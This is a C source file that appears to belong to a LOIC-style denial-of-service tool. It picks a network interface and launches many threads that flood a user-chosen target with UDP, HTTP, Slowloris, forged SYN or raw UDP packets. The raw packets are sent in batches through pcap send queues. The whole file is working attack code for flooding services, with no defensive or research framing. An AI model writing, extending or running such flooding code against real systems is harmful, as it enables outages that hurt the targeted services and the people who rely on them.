#include "superCanon.h"

pthread_t threads[1024]; // Lazors
pthread_mutex_t canon_mutex = PTHREAD_MUTEX_INITIALIZER;


int auto_detect_custom_device() {

    int pcap_index = charge_superCanon();
    int my_index = -1;


    if ( pcap_index != -1 ) {
        my_index = get_myindex_from_pcapindex( pcap_index );
    }

    return my_index;
}

int charge_superCanon() {

    int nb_dev = c_devices_count();
    int nb_tested_dev = 0;
    printf("%d devices found !\n",nb_dev);

    pthread_t threads_listen[32];
    int m_return_codes[32];

    int rett = 0;

    char* dst = ip2string( randIP(0) );

    int port = p_random(100,13370);

    int i;
    for (i=1; i <= nb_dev; i++) {

        pcap_if_t* dev = c_get_device_from_index(i);


        char* ip_addr = c_ip_from_device(dev);



        printf("%s (%s)\n",dev->name, ip_addr);

        if ( strlen(ip_addr) > 1 ) {

            char* args[4];


            args[0] = (char*) malloc( (strlen(dev->name) + 1)*sizeof(char));
            strcpy(args[0],dev->name);
            args[1] = ip_addr;
            args[2] = dst;
            args[3] = (char*) malloc( sizeof(char) * 10 );
            p_itoa(port,args[3]);

            printf("Opening %s, %s -> %s ..\n",args[0],args[1],args[2]);

            int err = pthread_create(&threads_listen[nb_tested_dev], NULL, (void*)c_get_pattern_packet, (void*) args );
            if ( err != 0 ) {
                printf("ErrorTTTT %d\n",nb_tested_dev);
            }
            else {
                printf("OKTTTTT %d\n",nb_tested_dev);
                nb_tested_dev++;
            }


        }

    }

    send_pattern_packet(dst,port);
    printf("Tested devs : %d\n",nb_tested_dev);

    for (i=1; i <= nb_tested_dev; i++) {

        m_return_codes[i-1] = 1;

        pthread_join(threads_listen[i-1], (void*) &rett);
        printf("Joinded thread %d\n",i);

        m_return_codes[i-1] = (int) rett;


    }

    int matching = -1;
    int k;
    for (k=1; k <= nb_dev; k++) {

        if (m_return_codes[k-1] == 0) {
            printf("Matching with device %d !\n",k);
            pcap_if_t* dev = c_get_device_from_index(k);

            setInterfaceIndex(k);
            setInterfaceName(dev->name);
            //pcap_freealldevs(dev);
            matching = k;

        }

    }

    return matching;

}


int superFire(int id) {

    switch( getProtocol() ) {
        case UDP:
            return udp_fire(id);
            break;
        case HTTP:
            return http_fire_classic(id);
            break;
        case SLOW_HTTP:
            return slowloris_fire(id);
            break;
        case SYN:
            if ( isNetworkReady() == TRUE ) {
                return syn_superFire(id);
            }
            else
                loic_error("Network is not configured.", CONSOLE);
            break;
        case SUDP:
            if ( isNetworkReady() == TRUE ) {
                return udp_superFire(id);
            }
            else
                loic_error("Network is not configured.", CONSOLE);
            break;
        default:
            return tcp_fire(id);
            break;
    }

    return -1;
}

int start_superCanon() {


    if ( getStatus() == READY ) {

        if ( strcmp(getTarget(),"") != 0 ) {

            printf("Canon charged !\n");

            int i;
            for ( i=0; i < getNbThreads(); i++ ) {
                pthread_create(&threads[i],NULL,(void*)superFire,(void*)i);
            }

            /* If one or several threads running */
            if (i > 0)
                setStatus(FIRING);

            pthread_t thread_timeout;
            pthread_create(&thread_timeout,NULL,(void*)oversee_timeout,(void*)getTimeout());

            int total_packets_sent = 0;

            for ( i=0; i < getNbThreads(); i++ ) {
                int packets_sent = 0;
                pthread_join(threads[i],(void*)&packets_sent);
                printf("Canon %d |--> %d packets sent\n",i,packets_sent);
                total_packets_sent += packets_sent;
            }


            setStatus(READY);
            printf("%d packets sent !\n",total_packets_sent);

            return 0;

        }
        else
            loic_error("You have not selected a target", CONSOLE);
    }
    else
        loic_error("Not ready", CONSOLE);

    return 2;
}

int syn_superFire(int id) {


        pcap_t* outdesc;


        char errbuf[PCAP_ERRBUF_SIZE];

        int caplen, sync;

        #ifdef WIN32
            u_int res;
            pcap_send_queue* squeue;
            float cpu_time;
        #endif

        int size = -1;

        u_int npacks = 0;

        int bomb_size = 150;

        u_char* pkt_data = (u_char*) malloc( sizeof(u_char) * 100 ) ;
        size = c_forge_packet(pkt_data, SYN);


        print_packet(pkt_data, size);



        struct timeval ts = { 0, 0 };
        struct pcap_pkthdr pcap_headerv = { ts, 0, 0 };
        struct pcap_pkthdr* pcap_header = &pcap_headerv;
        pcap_header->caplen = size;
        pcap_header->len = size;

        caplen = ( size * sizeof(u_char) ) * bomb_size ;

        print_packet(pkt_data,size);

        sync = FALSE;

        char* device = (char*) malloc(sizeof(char) * 1024);

        strcpy(device, getInterfaceName());



    /* Open the output adapter */
    if ( (outdesc = pcap_open( device, 100, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, errbuf) ) == NULL) {
        printf("Unable to open adapter %s.\n", device);
        return -1;
    }

    while ( getStatus() == FIRING && caplen > 0) {

        /* Windows Only */
        #ifdef WIN32


            /* Allocate a send queue */
            squeue = pcap_sendqueue_alloc(caplen);


            int i;
            /* Fill the queue with the packets from the file */
            for ( i=0; i < bomb_size; i++ ) {
                printf("%d caching : %d\n",i,caplen);


                if ( pcap_sendqueue_queue(squeue, pcap_header, pkt_data) == -1 ) {
                    printf("Warning: packet buffer too small, not all the packets will be sent.\n");
                    break;
                }
                else
                    npacks++;

            }

            /* Transmit the queue */

            cpu_time = (float) clock();



            if ((res = pcap_sendqueue_transmit(outdesc, squeue, sync)) < squeue->len)  {
                printf("An error occurred sending the packets: %s. Only %d bytes were sent\n", pcap_geterr(outdesc), res);
            }



            cpu_time = (clock() - cpu_time)/CLK_TCK;

            printf ("\n%d:\nElapsed time: %5.3f\n", id, cpu_time);
            printf ("\nBytes : %d (%d)\n", res, caplen);
            printf ("\nTotal packets generated = %d", npacks);
            printf ("\nAverage packets per second = %d", (int)((double)npacks/cpu_time));
            printf ("\n");

            /* free the send queue */
            pcap_sendqueue_destroy(squeue);



            /* No Windows */

        #elif defined (linux)

            pcap_sendpacket(outdesc, pkt_data, size);
            npacks++;

        #endif
    }

    printf("END FIRE (%d)\n",caplen);

    /*
     * lose the output adapter
     * IMPORTANT: remember to close the adapter, otherwise there will be no guarantee that all the
     * packets will be sent!
     */
    pcap_close(outdesc);


    return npacks;

}

int udp_superFire(int id) {

        pcap_t* outdesc;

        char errbuf[PCAP_ERRBUF_SIZE];

        int caplen, sync;
        int size = -1;

        #ifdef WIN32
            u_int res;
            pcap_send_queue* squeue;
            float cpu_time;
        #endif


        u_int npacks = 0;

        int bomb_size = 150;

        u_char* pkt_data = (u_char*) malloc( sizeof(u_char) * 100 ) ;
        size = c_forge_packet(pkt_data, UDP);


        print_packet(pkt_data, size);

        struct timeval ts = { 0, 0 };
        struct pcap_pkthdr pcap_headerv = { ts, 0, 0 };
        struct pcap_pkthdr* pcap_header = &pcap_headerv;
        pcap_header->caplen = size;
        pcap_header->len = size;

        caplen = ( size * sizeof(u_char) ) * bomb_size ;

        print_packet(pkt_data,size);

        sync = FALSE;

        char* device = (char*) malloc(sizeof(char) * 1024);

        strcpy(device, getInterfaceName());




    /* Open the output adapter */
    if ( (outdesc = pcap_open( device, 100, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, errbuf) ) == NULL) {
        printf("Unable to open adapter %s.\n", device);
        return -1;
    }

    while ( getStatus() == FIRING && caplen > 0) {

        /* Windows Only */
        #ifdef WIN32


            /* Allocate a send queue */
            squeue = pcap_sendqueue_alloc(caplen);


            int i;
            /* Fill the queue with the packets from the file */
            for ( i=0; i < bomb_size; i++ ) {
                printf("%d caching : %d\n",i,caplen);


                if ( pcap_sendqueue_queue(squeue, pcap_header, pkt_data) == -1 ) {
                    printf("Warning: packet buffer too small, not all the packets will be sent.\n");
                    break;
                }
                else
                    npacks++;

            }

            /* Transmit the queue */

            cpu_time = (float) clock();



            if ((res = pcap_sendqueue_transmit(outdesc, squeue, sync)) < squeue->len)  {
                printf("An error occurred sending the packets: %s. Only %d bytes were sent\n", pcap_geterr(outdesc), res);
            }



            cpu_time = (clock() - cpu_time)/CLK_TCK;

            printf ("\n%d:\nElapsed time: %5.3f\n", id, cpu_time);
            printf ("\nBytes : %d (%d)\n", res, caplen);
            printf ("\nTotal packets generated = %d", npacks);
            printf ("\nAverage packets per second = %d", (int)((double)npacks/cpu_time));
            printf ("\n");

            /* free the send queue */
            pcap_sendqueue_destroy(squeue);



            /* No Windows */

        #elif defined (linux)

            pcap_sendpacket(outdesc, pkt_data, size);
            npacks++;

        #endif

    }

    printf("END FIRE (%d)\n",caplen);

    /*
     * lose the output adapter
     * IMPORTANT: remember to close the adapter, otherwise there will be no guarantee that all the
     * packets will be sent!
     */
    pcap_close(outdesc);


    return npacks;

}

int test_superFire(int id) {


        pcap_t* outdesc;


        char errbuf[PCAP_ERRBUF_SIZE];

        int caplen, sync;

        #ifdef WIN32
            u_int res;
            pcap_send_queue* squeue;
            float cpu_time;
        #endif

        u_int npacks = 0;

        int bomb_size = 150;


        simple_pkt_t* packet;

        pthread_mutex_lock(&canon_mutex);

            packet = getPatternPacket();

        pthread_mutex_unlock(&canon_mutex);


        u_char* pkt_data = malloc( (sizeof(u_char) + 1) * packet->size ) ;
        pktcpy(pkt_data,packet->pkt_data,packet->size);

        printf("pp:\n");
        print_packet(packet->pkt_data,packet->size);


        int size = packet->size;

        struct timeval ts = { 0, 0 };
        struct pcap_pkthdr pcap_headerv = { ts, 0, 0 };
        struct pcap_pkthdr* pcap_header = &pcap_headerv;
        pcap_header->caplen = size;
        pcap_header->len = size;

        caplen = ( size * sizeof(u_char) ) * bomb_size ;

        print_packet(pkt_data,size);

        sync = FALSE;

        char* device = (char*) malloc(sizeof(char) * 1024);

        strcpy(device, getInterfaceName());




    /* Open the output adapter */
    if ( (outdesc = pcap_open( device, 100, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, errbuf) ) == NULL) {
        printf("Unable to open adapter %s.\n", device);
        return -1;
    }

    while ( getStatus() == FIRING && caplen > 0) {

        /* Windows Only */
        #ifdef WIN32


            /* Allocate a send queue */
            squeue = pcap_sendqueue_alloc(caplen);


            int i;
            /* Fill the queue with the packets from the file */
            for ( i=0; i < bomb_size; i++ ) {
                printf("%d caching : %d\n",i,caplen);


                if ( pcap_sendqueue_queue(squeue, pcap_header, pkt_data) == -1 ) {
                    printf("Warning: packet buffer too small, not all the packets will be sent.\n");
                    break;
                }
                else
                    npacks++;

            }

            /* Transmit the queue */

            cpu_time = (float) clock();



            if ((res = pcap_sendqueue_transmit(outdesc, squeue, sync)) < squeue->len)  {
                printf("An error occurred sending the packets: %s. Only %d bytes were sent\n", pcap_geterr(outdesc), res);
            }



            cpu_time = (clock() - cpu_time)/CLK_TCK;

            printf ("\n%d:\nElapsed time: %5.3f\n", id, cpu_time);
            printf ("\nBytes : %d (%d)\n", res, caplen);
            printf ("\nTotal packets generated = %d", npacks);
            printf ("\nAverage packets per second = %d", (int)((double)npacks/cpu_time));
            printf ("\n");

            /* free the send queue */
            pcap_sendqueue_destroy(squeue);



            /* No Windows */

        #elif defined (linux)

            pcap_sendpacket(outdesc, pkt_data, size);
            npacks++;

        #endif

    }

    printf("END FIRE (%d)\n",caplen);

    /*
     * lose the output adapter
     * IMPORTANT: remember to close the adapter, otherwise there will be no guarantee that all the
     * packets will be sent!
     */
    pcap_close(outdesc);


    return npacks;

}
